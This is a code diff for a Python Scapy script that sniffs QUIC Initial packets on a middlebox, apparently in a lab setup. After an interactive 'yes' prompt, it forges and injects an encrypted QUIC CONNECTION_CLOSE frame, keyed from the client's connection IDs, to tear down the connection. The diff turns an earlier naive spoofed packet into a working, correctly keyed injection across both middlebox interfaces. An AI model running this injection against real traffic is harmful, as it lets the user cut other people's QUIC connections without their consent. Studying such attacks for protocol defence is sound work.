@@ -8,20 +8,29 @@ from connection_close import QUIC_CONNECTION_CLOSE
 bind_bottom_up(UDP, QUIC, dport=443)
 bind_bottom_up(UDP, QUIC, sport=443)
 bind_layers(UDP, QUIC, dport=443, sport=443)
+from forge import forge_cc_scapy
+
+
+
+
 def handle_quic(pkt):
     # Only process if this packet has a QUIC Initial header
-    if pkt.haslayer(UDP):
-        if QUIC_Initial in pkt or pkt.haslayer(QUIC_Initial):
+    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr('middlebox-eth0'):
+        if pkt.sniffed_on == 'middlebox-eth0' and QUIC_Initial in pkt:
             qi = pkt[QUIC_Initial]
-            print("QUIC Initial packet detected")
-            print(f"  - Version       : 0x{qi.Version:08X}")
-            print(f"  - DestConnID    : {qi.DstConnID.hex()}")
-            print(f"  - SrcConnID     : {qi.SrcConnID.hex()}")
-            print(f"  - TokenLength   : {qi.TokenLen}")
-            print(f"  - PacketNumber  : {qi.PacketNumber}")
-            print(f"  - PayloadLength : {qi.Length}")
+            print(f"""QUIC Initial packet detected
+              - IP Src : {pkt[IP].src}
+              - IP Sport : {pkt[UDP].sport}
+              - IP Dst : {pkt[IP].dst}
+              - IP Dport : {pkt[UDP].dport}
+              - Version       : 0x{qi.Version:08X}
+              - DestConnID    : {qi.DstConnID.hex()}
+              - SrcConnID     : {qi.SrcConnID.hex()}
+              - TokenLength   : {qi.TokenLen}")
+              - PacketNumber  : {qi.PacketNumber}")
+              - PayloadLength : {qi.Length}""")
             # Raw (still encrypted) payload bytes
-            raw = bytes(qi.payload)
+            #raw = bytes(qi.payload)
             #print(f"  - Encrypted payload (first 32B): {raw[:32].hex()}…")
             if input("Enter 'yes' to attack!: ") == "yes":
                 """if pkt.sniffed_on == 'middlebox-eth0':
@@ -62,20 +71,24 @@ def handle_quic(pkt):
                     frame_type    = 0,            # e.g. PADDING triggered it
                     reason_phrase = b"oops!"
                 )
+                frame  = bytes(cc)
+                tpl    = (pkt[IP].src, pkt[UDP].sport, pkt[IP].dst, pkt[UDP].dport)
+                dcid_for_keys   = qi.DstConnID      # client-chosen DCID → secrets
+                dcid_in_header  = qi.SrcConnID      # client’s SrcCID     → header
+                forged = forge_cc_scapy(
+                    dcid_secret = dcid_for_keys,
+                    dcid_header = dcid_in_header,
+                    tpl = tpl,
+                    frame = frame)
+                send(forged)
 
-                pkt = (
-                    IP(dst=pkt[IP].src)/
-                    UDP(sport=12345, dport=443)/
-                    initial/
-                    cc
-                )
 
-                send(pkt)
         
 
 # Sniff UDP 443 traffic and invoke handle_quic for each packet
 sniff(
     #iface="Ethernet 2",
+    iface=['middlebox-eth0', 'middlebox-eth1'],
     #filter="udp port 443",
     prn=handle_quic,         # callback for every packet
     store=False                  # don’t keep packets in memory
